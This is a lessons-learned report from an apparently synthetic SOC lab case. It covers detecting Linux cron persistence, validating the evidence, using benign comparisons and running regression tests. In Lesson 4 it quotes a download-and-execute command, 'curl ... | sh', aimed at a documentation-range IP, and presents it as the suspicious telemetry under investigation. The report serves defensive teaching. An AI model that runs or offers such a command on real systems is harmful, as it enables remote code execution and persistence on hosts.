# CASE-009 — Lessons Learned

## Purpose

This document records the lessons learned from the CASE-009 Linux security investigation.

The focus is on detection engineering, investigation quality, evidence handling, false-positive control, and future improvements.

## Case Summary

CASE-009 investigated suspicious Linux cron persistence activity detected by:

- Detection ID: `DET-LINUX-001`
- Alert ID: `ALERT-CASE-009-DET-LINUX-001`
- Host: `lab-linux-02`
- User: `analyst`
- Severity: High
- Confidence: High
- ATT&CK: `T1053.003` — Cron

The detection identified three suspicious indicators in `EVT-009001`:

1. `cron_persistence_path`
2. `shell_download_execution`
3. `hidden_or_tmp_payload`

A benign administrative event, `EVT-009002`, did not trigger the detection.

## Lesson 1 — Multiple Indicators Improve Context

Treating every cron modification as malicious would create unnecessary alerts because legitimate administrators routinely manage scheduled tasks.

The detection instead requires multiple suspicious indicators.

This provides stronger context than relying on a single cron-related condition.

### Improvement

Continue testing combinations of:

- Cron paths.
- Suspicious command lines.
- Download behavior.
- Temporary locations.
- Hidden payload indicators.
- User and host context.

## Lesson 2 — Benign Comparisons Are Essential

`EVT-009002` demonstrated legitimate interactive cron administration using:

```text
crontab -e

The event did not trigger the detection.

Including benign telemetry in the case fixture provides an important regression test against overly broad detection logic.

Improvement

Continue adding realistic benign administrative events to future Linux detection tests.

Lesson 3 — Detection Does Not Equal Compromise

The investigation demonstrated the importance of separating:

Suspicious Activity

from:

Confirmed Compromise

The telemetry records a suspicious command and persistence-related indicators.

It does not establish that:

A payload was successfully downloaded.
A payload executed successfully.
The cron configuration became active.
Malware was present.
The host was compromised.
Improvement

Maintain explicit evidence boundaries in alerts, investigations, and final reports.

Lesson 4 — Command-Line Evidence Requires Validation

The recorded command:

curl http://203.0.113.80/payload.sh | sh

is a strong behavioral indicator for investigation.

However, command-line telemetry alone does not prove that network retrieval or shell execution succeeded.

Improvement

Correlate command-line telemetry with:

Network connection events.
Process execution results.
File creation.
File hashes.
Malware-analysis results.
Lesson 5 — ATT&CK Mapping Provides Investigative Structure

Mapping the activity to:

T1053.003 — Cron

provides a consistent behavioral classification for the investigation.

However, ATT&CK mapping should describe observed behavior rather than be treated as independent proof of compromise.

Improvement

Continue mapping detections to ATT&CK while maintaining evidence-based conclusions.

Lesson 6 — Short Observation Windows Can Miss Slow Activity

The current detection evaluates suspicious indicators within an individual persistence-related event.

An attacker or malicious process could distribute related actions across multiple events or over a longer period.

Improvement

Future detection engineering should consider:

Multi-event correlation.
Longer observation windows.
Host-based correlation.
User-based correlation.
Process ancestry.
Network-to-process relationships.
Lesson 7 — Evidence Preservation Must Precede Destructive Response

If suspicious persistence were confirmed during a real authorized investigation, analysts should preserve relevant evidence before removing files, processes, or configurations.

This protects the investigation from losing important forensic information.

Improvement

Maintain response procedures that explicitly separate:

Evidence preservation.
Validation.
Containment.
Eradication.
Recovery.
Closure.
Lesson 8 — Threat Intelligence Must Be Evidence-Based

The destination:

203.0.113.80

is treated as a synthetic documentation-range observable.

It must not be represented as confirmed malicious infrastructure.

Likewise, /payload.sh is a suspicious resource reference, not a confirmed malware artifact.

Improvement

Maintain a clear distinction between:

Observed indicators.
Suspicious indicators.
Verified malicious indicators.
External threat-intelligence findings.
Lesson 9 — Detection Engineering Requires Regression Testing

The CASE-009 implementation required several iterations during development.

The final regression suite reached:

24 passed

The focused Linux tests also passed.

This demonstrates the importance of validating both suspicious and benign behavior after changing detection logic.

Improvement

Every new detection should include:

Positive test.
Negative test.
Malformed-input tests.
Missing-field tests.
Boundary-condition tests.
Regression coverage.
Lesson 10 — Detection Feedback Should Produce Engineering Work

The investigation identified several opportunities for future detection improvement:

Multi-event correlation.
Process ancestry.
Cron service execution telemetry.
File modification correlation.
Network correlation.
File hash enrichment.
Malware-analysis integration.
Slow-activity detection.
Additional benign scenarios.
Adversarial evasion tests.

These improvements should become implementation and test work rather than unsupported documentation claims.

Detection Feedback Loop

The CASE-009 investigation establishes the following feedback cycle:

Observed Activity
       ↓
Detection
       ↓
Alert
       ↓
Investigation
       ↓
Evidence Validation
       ↓
Detection Weaknesses
       ↓
Engineering Improvements
       ↓
New Tests
       ↓
Validation
       ↓
Improved Detection

This feedback loop should be reused across future SOC cases.

Portfolio Engineering Lessons

CASE-009 reinforces several principles for the broader CYBERNOVA SOC laboratory:

Evidence Before Conclusions

Every investigation conclusion must be traceable to available evidence.

Detection Before Documentation Claims

A capability should not be described as implemented until the underlying detection logic and validation evidence exist.

Tests Before Confidence

Detection behavior should be demonstrated through repeatable tests rather than assumed from code inspection.

Benign Data Matters

Good SOC detections must demonstrate not only what they detect but also what they intentionally do not detect.

Limitations Must Be Explicit

A professional investigation should clearly state what the evidence cannot establish.

Final Lesson

The central lesson from CASE-009 is:

A strong SOC investigation does not simply identify suspicious activity; it connects detection, evidence, validation, hunting, response, and limitations into a defensible chain of reasoning.

The objective is not to maximize alerts.

The objective is to produce reliable, explainable, testable, and evidence-based security decisions.

Laboratory Boundary

CASE-009 uses synthetic telemetry in an authorized defensive laboratory environment.

No production incident, real victim, real credential, confirmed malware infection, or real-world compromise is represented.

All lessons are derived from the laboratory implementation and evidence available in this case.
